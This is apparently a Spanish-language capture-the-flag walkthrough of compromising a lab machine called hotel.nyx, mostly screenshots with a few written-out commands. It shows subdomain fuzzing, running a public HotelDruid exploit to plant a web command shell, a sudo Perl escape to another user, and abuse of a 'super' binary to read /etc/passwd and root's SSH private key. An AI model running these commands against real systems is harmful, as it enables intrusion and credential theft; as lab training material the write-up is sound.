Hacemos el escaneo de nmap:
![[Pasted image 20240302110052.png]]
Esto corre por el puerto 80:
![[Pasted image 20240302110118.png]]
Si lanzamos un whatweb nos encontramos con un email que nos indica un dominio:
![[Pasted image 20240302110241.png]]
Lo añadimos al archivo hosts:
![[Pasted image 20240302110312.png]]
Hacemos una búsqueda de subdominios con wfuzz y vemos el siguiente subdominio:
```bash
wfuzz -c --hc=404 --hl=616 -t 200 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.hotel.nyx" -u 192.168.0.28
```
![[Pasted image 20240302110816.png]]
![[Pasted image 20240302110842.png]]
Tenemos esta web que pone algo de hoteldruid:
![[Pasted image 20240302110951.png]]
Buscamos en github algún exploit y lo encontramos:
![[Pasted image 20240302111001.png]]
Probamos el exploit:
![[Pasted image 20240302111022.png]]
Y lo ejecutamos:
```bash
python3 exploit.py -t http://reservations.hotel.nyx/ --noauth
```

Vemos que ha insertado una CMD y nos pone justo la ruta para acceder a ella:
```bash
http://reservations.hotel.nyx/dati/selectappartamenti.php
```
![[Pasted image 20240302111332.png]]
![[Pasted image 20240302111315.png]]
Y ahora en este punto obtenemos una reverse shell url encodeada:
![[Pasted image 20240302111531.png]]
![[Pasted image 20240302111540.png]]
![[Pasted image 20240302111548.png]]
Y vemos que podemos ejecutar perl como el usuario sun:
![[Pasted image 20240302111648.png]]
Y ejecutamos el siguiente comando que podemos encontrar en gtfobins para convertirnos en el usuario sun:
```bash
sudo -u sun /usr/bin/perl -e 'exec "/bin/sh";'
```
![[Pasted image 20240302111749.png]]
Ahora si ejecutamos una búsqueda de binarios, nos llama la atención el binario de super:
![[Pasted image 20240302111832.png]]
Esto nos sale si lo ejecutamos:
![[Pasted image 20240302111924.png]]
Lo que nos hace pensar que al secret le podemos pasar algún archivo, por ejemplo el passwd, aunque se nos abre al reves:
```bash
/usr/bin/super secret /etc/passwd
```
![[Pasted image 20240302111944.png]]
Podemos leer el archivo id_rsa de root pasándole el comando rev para invertir el orden y así poder visualizarlo normal:
```bash
/usr/bin/super secret /root/.ssh/id_rsa | rev
```
![[Pasted image 20240302112114.png]]
Y ahora crackeamos este hash con john the ripper:
![[Pasted image 20240302112228.png]]
Y ahora podemos entrar ssh utilizando este salvoconducto:
![[Pasted image 20240302112351.png]]
